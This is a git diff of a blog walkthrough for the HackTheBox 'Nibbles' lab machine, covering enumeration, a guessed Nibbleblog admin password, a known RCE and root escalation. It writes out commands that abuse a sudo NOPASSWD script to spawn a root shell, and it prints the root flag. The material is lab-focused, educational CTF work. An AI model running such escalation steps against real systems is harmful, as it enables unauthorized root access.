@@ -4,10 +4,10 @@ title: Hackthebox Nibbles Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://inar1.github.io/public/images/2019-09-30/nibbles-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-29/nibbles-badge.png)
 ## Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
-To learn a new technique/knowledge, try to solve all machines (As much as possible!!).
+To learn a new technique/knowledge, solve all machines (As much as possible!!).
 This is a walkthrough of a machine "Nibbles" on that website.<br>
 
 ### Complation
@@ -45,7 +45,7 @@ Gobuster HTTP:
 ### 2. Getting User
 
 We have only one port interesting which is 80 (HTTP) and sounds there is nothing here.
-![placeholder](https://inar1.github.io/public/images/2019-09-30/nibbles-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-29/2019-09-29-09-52-04.png)
 
 By running curl, we can find an interesting comment on the webpage.
 {% highlight shell %}
@@ -79,7 +79,7 @@ Content-Type: text/html
 {% endhighlight %}
 
 It said there is nothing interesting there. However, it is an interesting website.
-![placeholder](https://inar1.github.io/public/images/2019-09-30/nibbles-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-29/2019-09-29-09-57-44png)
 
 try to gobuster again.
 In the "README", we can see that current version of this "Nibbleblog" is "v4.0.3".
@@ -116,7 +116,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 {% endhighlight %}
 
-Since we had juicie information "Nibbleblog v4.0.3", try to look for well-known exploit.<br>
+Since we had juicy information "Nibbleblog v4.0.3", try to look for well-known exploit.<br>
 {% highlight shell %}
 root@kali:~# searchsploit nibble
 ------------------------------------------------------- ----------------------------------------
@@ -131,7 +131,7 @@ Shellcodes: No Result
 
 Sounds there is a RCE with metasploit.<br>
 However, we need a guessing to figure out what is the credential.<br>
-This time, the username is same as default and password was the server name.
+This time, the username is same as default and password is the server name.
 {% highlight shell %}
 admin:nibbles
 {% endhighlight %}
@@ -221,16 +221,34 @@ User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 {% endhighlight %}
 
-Then, create the file "/home/nibbler/personal/stuff/monitor.sh" with content spawning shell.
+Then, create the file "/home/nibbler/personal/stuff/monitor.sh" with content to spawn root shell.
 {% highlight shell %}
-nibbler@Nibbles:/home/nibbler$ echo '#! /bin/sh' > /home/nibbler/personal/stuff/monitor.sh
-<er$ echo '#! /bin/sh' > /home/nibbler/personal/stuff/monitor.sh  
+nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff/
+mkdir -p /home/nibbler/personal/stuff/
+{% endhighlight %}
+{% highlight shell %}
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "sudo su" > monitor.sh
+echo "sudo su" > monitor.sh
 
-nibbler@Nibbles:/home/nibbler$ echo 'sh -c /bin/sh' >> /home/nibbler/personal/stuff/monitor.sh
-<er$ echo 'sh -c /bin/sh' >> /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
+chmod +x monitor.sh
+{% endhighlight %}
 
-nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
-cat /home/nibbler/personal/stuff/monitor.sh
-#! /bin/sh
-sh -c /bin/sh
+Finally, execute the "monitor.sh". It takes time a bit but we can ahieve a root shell.
+{% highlight shell %}
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
+sudo ./monitor.sh
+
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: unable to resolve host Nibbles: Connection timed out
+root@Nibbles:/home/nibbler/personal/stuff# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+{% endhighlight %}
+
+root.txt is in the directory "/root".
+{% highlight shell %}
+root@Nibbles:~# cat root.txt
+cat root.txt
+b6d745c0dfb6457c55591efc898ef88c
 {% endhighlight %}
